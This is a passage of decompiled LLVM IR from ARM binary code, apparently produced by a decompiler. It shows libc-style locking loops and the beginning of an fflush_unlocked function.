  %v3_15fc876 = icmp uge i32 %v2_15fc474, %v2_15fb8
  store i1 %v3_15fc876, i1* %cpsr_c.global-to-local, align 1
  %v9_15fc882 = icmp eq i32 %v2_15fc474, %v2_15fb8
  br i1 %v9_15fc882, label %dec_label_pc_15fd0, label %dec_label_pc_15fe8

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fb8, %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge
  %v0_15fd083 = phi i32 [ %v1_15fc8.pre, %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge ], [ %v2_15fb8, %dec_label_pc_15fb8 ]
  store i32 %v0_15fd083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fe0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fe0, label %dec_label_pc_15fe4, label %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge

dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge:  ; preds = %dec_label_pc_15fd0
  %v0_15fc4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fc8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15fc4 = inttoptr i32 %v0_15fc4.pre to i32*
  %v2_15fc4 = load i32, i32* %v1_15fc4, align 4
  store i32 %v2_15fc4, i32* %r3.global-to-local, align 4
  %v3_15fc8 = icmp uge i32 %v2_15fc4, %v1_15fc8.pre
  store i1 %v3_15fc8, i1* %cpsr_c.global-to-local, align 1
  %v9_15fc8 = icmp eq i32 %v2_15fc4, %v1_15fc8.pre
  br i1 %v9_15fc8, label %dec_label_pc_15fd0, label %dec_label_pc_15fe8

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fd0
  %v0_15fe4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15fe4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fe8

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fb8, %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge, %dec_label_pc_15fe4
  %v0_15ff0 = phi i32 [ %v0_15fe4, %dec_label_pc_15fe4 ], [ %v2_15fc474, %dec_label_pc_15fb8 ], [ %v2_15fc4, %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge ]
  %v1_15fe8 = phi i32 [ %v0_15fe4, %dec_label_pc_15fe4 ], [ %v2_15fb8, %dec_label_pc_15fb8 ], [ %v1_15fc8.pre, %dec_label_pc_15fd0.dec_label_pc_15fc4_crit_edge ]
  %v3_15fe8 = icmp uge i32 %v0_15ff0, %v1_15fe8
  store i1 %v3_15fe8, i1* %cpsr_c.global-to-local, align 1
  %v9_15fe8 = icmp eq i32 %v0_15ff0, %v1_15fe8
  br i1 %v9_15fe8, label %dec_label_pc_15ff0, label %dec_label_pc_15fe8.dec_label_pc_15fb8_crit_edge

dec_label_pc_15fe8.dec_label_pc_15fb8_crit_edge:  ; preds = %dec_label_pc_15fe8
  %v0_15fb8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fb8

dec_label_pc_15ff0:                               ; preds = %dec_label_pc_15fe8
  %v2_15ff0 = icmp ne i32 %v1_15fe8, 0
  store i1 %v2_15ff0, i1* %cpsr_c.global-to-local, align 1
  %v7_15ff4 = icmp slt i32 %v1_15fe8, 2
  br i1 %v7_15ff4, label %dec_label_pc_16010, label %dec_label_pc_15ff8

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_15ff0
  %v0_15ff8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15ff8, i32* %r0.global-to-local, align 4
  %v0_15ffc = load i32, i32* %r1.global-to-local, align 4
  %v1_15ffc = add i32 %v0_15ffc, 129
  store i32 %v1_15ffc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %dec_label_pc_15f94, %dec_label_pc_15ff8, %dec_label_pc_15ff0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16014 = load i32, i32* %r5.global-to-local, align 4
  %v2_16014 = add i32 %v0_16014, 80
  %v3_16014 = inttoptr i32 %v2_16014 to i32*
  %v4_16014 = load i32, i32* %v3_16014, align 4
  store i32 %v4_16014, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1601c = inttoptr i32 %v4_16014 to i32*
  store i32 0, i32* %v2_1601c, align 4
  br label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %dec_label_pc_15e94, %dec_label_pc_15ebc, %dec_label_pc_16010
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16024 = load i32, i32* %r5.global-to-local, align 4
  %v2_16024 = add i32 %v0_16024, 160
  %v3_16024 = inttoptr i32 %v2_16024 to i32*
  %v4_16024 = load i32, i32* %v3_16024, align 4
  store i32 %v4_16024, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1602c = add i32 %v0_16024, 12
  %v3_1602c = inttoptr i32 %v2_1602c to i32*
  %v4_1602c = load i32, i32* %v3_1602c, align 4
  store i32 %v4_1602c, i32* %r1.global-to-local, align 4
  %v1_16030 = add i32 %v4_16024, 4
  %v2_16030 = inttoptr i32 %v1_16030 to i32*
  %v3_16030 = load i32, i32* %v2_16030, align 4
  store i32 %v3_16030, i32* %r2.global-to-local, align 4
  %v1_16034 = inttoptr i32 %v4_1602c to i32*
  %v2_16034 = load i32, i32* %v1_16034, align 4
  %v1_16038 = add i32 %v3_16030, -1
  store i32 %v1_16038, i32* %r2.global-to-local, align 4
  %v1_1603c = add i32 %v2_16034, -1
  store i32 %v1_1603c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16040 = icmp eq i32 %v1_16038, 0
  store i32 %v1_1603c, i32* %v1_16034, align 4
  %v0_16048 = load i32, i32* %r2.global-to-local, align 4
  %v1_16048 = load i32, i32* %r0.global-to-local, align 4
  %v2_16048 = add i32 %v1_16048, 4
  %v3_16048 = inttoptr i32 %v2_16048 to i32*
  store i32 %v0_16048, i32* %v3_16048, align 4
  br i1 %v2_16040, label %dec_label_pc_16050, label %dec_label_pc_160b0

dec_label_pc_16050:                               ; preds = %dec_label_pc_16020
  %v0_16050 = load i32, i32* %r2.global-to-local, align 4
  %v1_16050 = load i32, i32* %r0.global-to-local, align 4
  %v2_16050 = add i32 %v1_16050, 8
  %v3_16050 = inttoptr i32 %v2_16050 to i32*
  store i32 %v0_16050, i32* %v3_16050, align 4
  %v0_16054 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16054, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16058

dec_label_pc_16058:                               ; preds = %dec_label_pc_16088.dec_label_pc_16058_crit_edge, %dec_label_pc_16050
  %v0_16058 = phi i32 [ %v0_16058.pre, %dec_label_pc_16088.dec_label_pc_16058_crit_edge ], [ %v0_16054, %dec_label_pc_16050 ]
  %v1_16058 = inttoptr i32 %v0_16058 to i32*
  %v2_16058 = load i32, i32* %v1_16058, align 4
  store i32 %v2_16058, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16058, i32* %r2.global-to-local, align 4
  %v2_1606462 = load i32, i32* %v1_16058, align 4
  store i32 %v2_1606462, i32* %r3.global-to-local, align 4
  %v3_1606864 = icmp uge i32 %v2_1606462, %v2_16058
  store i1 %v3_1606864, i1* %cpsr_c.global-to-local, align 1
  %v9_1606870 = icmp eq i32 %v2_1606462, %v2_16058
  br i1 %v9_1606870, label %dec_label_pc_16070, label %dec_label_pc_16088

dec_label_pc_16070:                               ; preds = %dec_label_pc_16058, %dec_label_pc_16070.dec_label_pc_16064_crit_edge
  %v0_1607071 = phi i32 [ %v1_16068.pre, %dec_label_pc_16070.dec_label_pc_16064_crit_edge ], [ %v2_16058, %dec_label_pc_16058 ]
  store i32 %v0_1607071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16080 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16080, label %dec_label_pc_16084, label %dec_label_pc_16070.dec_label_pc_16064_crit_edge

dec_label_pc_16070.dec_label_pc_16064_crit_edge:  ; preds = %dec_label_pc_16070
  %v0_16064.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16068.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16064 = inttoptr i32 %v0_16064.pre to i32*
  %v2_16064 = load i32, i32* %v1_16064, align 4
  store i32 %v2_16064, i32* %r3.global-to-local, align 4
  %v3_16068 = icmp uge i32 %v2_16064, %v1_16068.pre
  store i1 %v3_16068, i1* %cpsr_c.global-to-local, align 1
  %v9_16068 = icmp eq i32 %v2_16064, %v1_16068.pre
  br i1 %v9_16068, label %dec_label_pc_16070, label %dec_label_pc_16088

dec_label_pc_16084:                               ; preds = %dec_label_pc_16070
  %v0_16084 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16084, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16088

dec_label_pc_16088:                               ; preds = %dec_label_pc_16058, %dec_label_pc_16070.dec_label_pc_16064_crit_edge, %dec_label_pc_16084
  %v0_16090 = phi i32 [ %v0_16084, %dec_label_pc_16084 ], [ %v2_1606462, %dec_label_pc_16058 ], [ %v2_16064, %dec_label_pc_16070.dec_label_pc_16064_crit_edge ]
  %v1_16088 = phi i32 [ %v0_16084, %dec_label_pc_16084 ], [ %v2_16058, %dec_label_pc_16058 ], [ %v1_16068.pre, %dec_label_pc_16070.dec_label_pc_16064_crit_edge ]
  %v3_16088 = icmp uge i32 %v0_16090, %v1_16088
  store i1 %v3_16088, i1* %cpsr_c.global-to-local, align 1
  %v9_16088 = icmp eq i32 %v0_16090, %v1_16088
  br i1 %v9_16088, label %dec_label_pc_16090, label %dec_label_pc_16088.dec_label_pc_16058_crit_edge

dec_label_pc_16088.dec_label_pc_16058_crit_edge:  ; preds = %dec_label_pc_16088
  %v0_16058.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16058

dec_label_pc_16090:                               ; preds = %dec_label_pc_16088
  %v2_16090 = icmp ne i32 %v1_16088, 0
  store i1 %v2_16090, i1* %cpsr_c.global-to-local, align 1
  %v7_16094 = icmp slt i32 %v1_16088, 2
  br i1 %v7_16094, label %dec_label_pc_160b0, label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %dec_label_pc_16090
  %v0_16098 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16098, i32* %r0.global-to-local, align 4
  %v0_1609c = load i32, i32* %r1.global-to-local, align 4
  %v1_1609c = add i32 %v0_1609c, 129
  store i32 %v1_1609c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_160b0

dec_label_pc_160b0:                               ; preds = %dec_label_pc_16020, %dec_label_pc_16098, %dec_label_pc_16090
  %v2_160b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_160b4, i32* %r4.global-to-local, align 4
  %v1_160b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_160b8

; uselistorder directives
  uselistorder i32 %v0_16084, { 1, 0, 2 }
  uselistorder i32 %v1_16068.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16058, { 1, 0 }
  uselistorder i32 %v0_15fe4, { 1, 0, 2 }
  uselistorder i32 %v1_15fc8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15fb8, { 1, 0 }
  uselistorder i32 %v0_15f84, { 2, 1, 0 }
  uselistorder i32 %v0_15f28, { 1, 0 }
  uselistorder i32 %v0_15f0c, { 1, 0, 2 }
  uselistorder i32 %v1_15ef0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15edc, { 1, 0 }
  uselistorder i32 %v0_15e80, { 1, 0, 2 }
  uselistorder i32 %v1_15e64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15e38, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 14, 13, 15, 11, 10, 12 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 44, 5, 6, 7, 8, 9, 10, 11, 13, 12, 0, 14, 15, 16, 39, 40, 17, 18, 19, 20, 21, 22, 23, 25, 24, 41, 26, 43, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 42, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 22, 23, 3, 4, 5, 6, 20, 21, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_160b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16088, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16070, { 1, 0 }
  uselistorder label %dec_label_pc_16020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15fe8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fd0, { 1, 0 }
  uselistorder label %dec_label_pc_15f84, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_15f4c, { 1, 0 }
  uselistorder label %dec_label_pc_15f20, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_15f10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ef8, { 1, 0 }
  uselistorder label %dec_label_pc_15e94, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_15e84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e6c, { 1, 0 }
}

define i32 @function_160c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_160c0:
  %v0_160c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_160c0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_160c0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_160c0, %bb
  %v10_160d4 = phi i32 [ %arg1, %dec_label_pc_160c0 ], [ 0, %bb ]
  ret i32 %v10_160d4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_160d8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  %v4_160e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 76) to i32*), align 4
  store i32 %v4_160e8, i32* %r3.global-to-local, align 4
  %v4_160ec = icmp uge i32 %tmp, %v4_160e8
  store i1 %v4_160ec, i1* %cpsr_c.global-to-local, align 1
  %v10_160ec = icmp eq i32 %tmp, %v4_160e8
  br i1 %v10_160ec, label %bb, label %dec_label_pc_16104

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16114

dec_label_pc_16104:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16108 = icmp eq i16* %arg1, null
  br i1 %v3_16108, label %dec_label_pc_16114, label %dec_label_pc_16428

dec_label_pc_16114:                               ; preds = %bb, %dec_label_pc_16104
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16104 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16118 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 160) to i32*), align 4
  store i32 %v4_16118, i32* %r5.global-to-local, align 4
  %v0_1611c = call i32 @__aeabi_read_tp()
  store i32 %v0_1611c, i32* %r0.global-to-local, align 4
  %v1_16120 = add i32 %v4_16118, 8
  %v2_16120 = inttoptr i32 %v1_16120 to i32*
  %v3_16120 = load i32, i32* %v2_16120, align 4
  store i32 %v3_16120, i32* %r3.global-to-local, align 4
  %v1_16124 = add i32 %v0_1611c, -1168
  store i32 %v1_16124, i32* %r8.global-to-local, align 4
  %v3_16128 = icmp uge i32 %v3_16120, %v1_16124
  store i1 %v3_16128, i1* %cpsr_c.global-to-local, align 1
  %v9_16128 = icmp eq i32 %v3_16120, %v1_16124
  br i1 %v9_16128, label %dec_label_pc_16170, label %dec_label_pc_16130

dec_label_pc_16130:                               ; preds = %dec_label_pc_16114
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16118, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1613c143 = inttoptr i32 %v4_16118 to i32*
  %v2_1613c144 = load i32, i32* %v1_1613c143, align 4
  store i32 %v2_1613c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16140146 = icmp eq i32 %v2_1613c144, 0
  br i1 %v9_16140146, label %dec_label_pc_16148, label %dec_label_pc_16160

dec_label_pc_16148:                               ; preds = %dec_label_pc_16130, %dec_label_pc_16148.dec_label_pc_1613c_crit_edge
  %v0_16148147 = phi i32 [ %v1_16140.pre, %dec_label_pc_16148.dec_label_pc_1613c_crit_edge ], [ 0, %dec_label_pc_16130 ]
  store i32 %v0_16148147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16158 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16158, label %dec_label_pc_1615c, label %dec_label_pc_16148.dec_label_pc_1613c_crit_edge

dec_label_pc_16148.dec_label_pc_1613c_crit_edge:  ; preds = %dec_label_pc_16148
  %v0_1613c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16140.pre = load i32, i32* @r4, align 4
  %v1_1613c = inttoptr i32 %v0_1613c.pre to i32*
  %v2_1613c = load i32, i32* %v1_1613c, align 4
  store i32 %v2_1613c, i32* %r3.global-to-local, align 4
  %v3_16140 = icmp uge i32 %v2_1613c, %v1_16140.pre
  store i1 %v3_16140, i1* %cpsr_c.global-to-local, align 1
  %v9_16140 = icmp eq i32 %v2_1613c, %v1_16140.pre
  br i1 %v9_16140, label %dec_label_pc_16148, label %dec_label_pc_16160

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16148
  %v0_1615c = load i32, i32* @r4, align 4
  store i32 %v0_1615c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %dec_label_pc_16130, %dec_label_pc_16148.dec_label_pc_1613c_crit_edge, %dec_label_pc_1615c
  %v0_16160 = phi i32 [ %v0_1615c, %dec_label_pc_1615c ], [ %v2_1613c144, %dec_label_pc_16130 ], [ %v2_1613c, %dec_label_pc_16148.dec_label_pc_1613c_crit_edge ]
  %v1_16160 = phi i32 [ %v0_1615c, %dec_label_pc_1615c ], [ 0, %dec_label_pc_16130 ], [ %v1_16140.pre, %dec_label_pc_16148.dec_label_pc_1613c_crit_edge ]
  %v3_16160 = icmp uge i32 %v0_16160, %v1_16160
  store i1 %v3_16160, i1* %cpsr_c.global-to-local, align 1
  %v9_16160 = icmp eq i32 %v0_16160, %v1_16160
  br i1 %v9_16160, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16160
  %v1_16164 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16164, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16160, %bb65
  %v1_16168 = xor i1 %v9_16160, true
  call void @__pseudo_cond_branch(i1 %v1_16168, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_1616c = load i32, i32* %r8.global-to-local, align 4
  %v1_1616c = load i32, i32* %r5.global-to-local, align 4
  %v2_1616c = add i32 %v1_1616c, 8
  %v3_1616c = inttoptr i32 %v2_1616c to i32*
  store i32 %v0_1616c, i32* %v3_1616c, align 4
  br label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %dec_label_pc_16114, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16174 = load i32, i32* @r6, align 4
  %v2_16174 = add i32 %v0_16174, 160
  %v3_16174 = inttoptr i32 %v2_16174 to i32*
  %v4_16174 = load i32, i32* %v3_16174, align 4
  store i32 %v4_16174, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1617c = add i32 %v0_16174, 12
  %v3_1617c = inttoptr i32 %v2_1617c to i32*
  %v4_1617c = load i32, i32* %v3_1617c, align 4
  store i32 %v4_1617c, i32* %r2.global-to-local, align 4
  %v1_16180 = add i32 %v4_16174, 4
  %v2_16180 = inttoptr i32 %v1_16180 to i32*
  %v3_16180 = load i32, i32* %v2_16180, align 4
  store i32 %v3_16180, i32* %r1.global-to-local, align 4
  %v1_16184 = inttoptr i32 %v4_1617c to i32*
  %v2_16184 = load i32, i32* %v1_16184, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16188 = icmp eq i32 %v3_16180, 0
  %v1_1618c = add i32 %v2_16184, 1
  store i32 %v1_1618c, i32* %r3.global-to-local, align 4
  store i32 %v1_1618c, i32* %v1_16184, align 4
  br i1 %v2_16188, label %dec_label_pc_16198, label %dec_label_pc_161f8

dec_label_pc_16198:                               ; preds = %dec_label_pc_16170
  %v0_16198 = load i32, i32* %r1.global-to-local, align 4
  %v1_16198 = load i32, i32* %r0.global-to-local, align 4
  %v2_16198 = add i32 %v1_16198, 8
  %v3_16198 = inttoptr i32 %v2_16198 to i32*
  store i32 %v0_16198, i32* %v3_16198, align 4
  %v0_1619c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1619c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge, %dec_label_pc_16198
  %v0_161a0 = phi i32 [ %v0_161a0.pre, %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge ], [ %v0_1619c, %dec_label_pc_16198 ]
  %v1_161a0 = inttoptr i32 %v0_161a0 to i32*
  %v2_161a0 = load i32, i32* %v1_161a0, align 4
  store i32 %v2_161a0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_161a0, i32* %r2.global-to-local, align 4
  %v2_161ac131 = load i32, i32* %v1_161a0, align 4
  store i32 %v2_161ac131, i32* %r3.global-to-local, align 4
  %v3_161b0133 = icmp uge i32 %v2_161ac131, %v2_161a0
  store i1 %v3_161b0133, i1* %cpsr_c.global-to-local, align 1
  %v9_161b0139 = icmp eq i32 %v2_161ac131, %v2_161a0
  br i1 %v9_161b0139, label %dec_label_pc_161b8, label %dec_label_pc_161d0

dec_label_pc_161b8:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge
  %v0_161b8140 = phi i32 [ %v1_161b0.pre, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ], [ %v2_161a0, %dec_label_pc_161a0 ]
  store i32 %v0_161b8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161c8, label %dec_label_pc_161cc, label %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge

dec_label_pc_161b8.dec_label_pc_161ac_crit_edge:  ; preds = %dec_label_pc_161b8
  %v0_161ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161b0.pre = load i32, i32* @r4, align 4
  %v1_161ac = inttoptr i32 %v0_161ac.pre to i32*
  %v2_161ac = load i32, i32* %v1_161ac, align 4
  store i32 %v2_161ac, i32* %r3.global-to-local, align 4
  %v3_161b0 = icmp uge i32 %v2_161ac, %v1_161b0.pre
  store i1 %v3_161b0, i1* %cpsr_c.global-to-local, align 1
  %v9_161b0 = icmp eq i32 %v2_161ac, %v1_161b0.pre
  br i1 %v9_161b0, label %dec_label_pc_161b8, label %dec_label_pc_161d0

dec_label_pc_161cc:                               ; preds = %dec_label_pc_161b8
  %v0_161cc = load i32, i32* @r4, align 4
  store i32 %v0_161cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161d0

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge, %dec_label_pc_161cc
  %v0_161d8 = phi i32 [ %v0_161cc, %dec_label_pc_161cc ], [ %v2_161ac131, %dec_label_pc_161a0 ], [ %v2_161ac, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ]
  %v1_161d0 = phi i32 [ %v0_161cc, %dec_label_pc_161cc ], [ %v2_161a0, %dec_label_pc_161a0 ], [ %v1_161b0.pre, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ]
  %v3_161d0 = icmp uge i32 %v0_161d8, %v1_161d0
  store i1 %v3_161d0, i1* %cpsr_c.global-to-local, align 1
  %v9_161d0 = icmp eq i32 %v0_161d8, %v1_161d0
  br i1 %v9_161d0, label %dec_label_pc_161d8, label %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge

dec_label_pc_161d0.dec_label_pc_161a0_crit_edge:  ; preds = %dec_label_pc_161d0
  %v0_161a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161d0
  %v2_161d8 = icmp ne i32 %v1_161d0, 0
  store i1 %v2_161d8, i1* %cpsr_c.global-to-local, align 1
  %v7_161dc = icmp slt i32 %v1_161d0, 2
  br i1 %v7_161dc, label %dec_label_pc_161f8, label %dec_label_pc_161e0

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161d8
  %v0_161e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_161e0, i32* %r0.global-to-local, align 4
  %v0_161e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_161e4 = add i32 %v0_161e4, 129
  store i32 %v1_161e4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161f8

dec_label_pc_161f8:                               ; preds = %dec_label_pc_16170, %dec_label_pc_161e0, %dec_label_pc_161d8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_161fc = load i32, i32* @r6, align 4
  %v2_161fc = add i32 %v0_161fc, 152
  %v3_161fc = inttoptr i32 %v2_161fc to i32*
  %v4_161fc = load i32, i32* %v3_161fc, align 4
  store i32 %v4_161fc, i32* %r5.global-to-local, align 4
  %v1_16200 = add i32 %v4_161fc, 8
  %v2_16200 = inttoptr i32 %v1_16200 to i32*
  %v3_16200 = load i32, i32* %v2_16200, align 4
  store i32 %v3_16200, i32* %r3.global-to-local, align 4
  %v1_16204 = load i32, i32* %r8.global-to-local, align 4
  %v3_16204 = icmp uge i32 %v3_16200, %v1_16204
  store i1 %v3_16204, i1* %cpsr_c.global-to-local, align 1
  %v9_16204 = icmp eq i32 %v3_16200, %v1_16204
  br i1 %v9_16204, label %dec_label_pc_1624c, label %dec_label_pc_1620c

dec_label_pc_1620c:                               ; preds = %dec_label_pc_161f8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_161fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16218123 = inttoptr i32 %v4_161fc to i32*
  %v2_16218124 = load i32, i32* %v1_16218123, align 4
  store i32 %v2_16218124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1621c126 = icmp eq i32 %v2_16218124, 0
  br i1 %v9_1621c126, label %dec_label_pc_16224, label %dec_label_pc_1623c

dec_label_pc_16224:                               ; preds = %dec_label_pc_1620c, %dec_label_pc_16224.dec_label_pc_16218_crit_edge
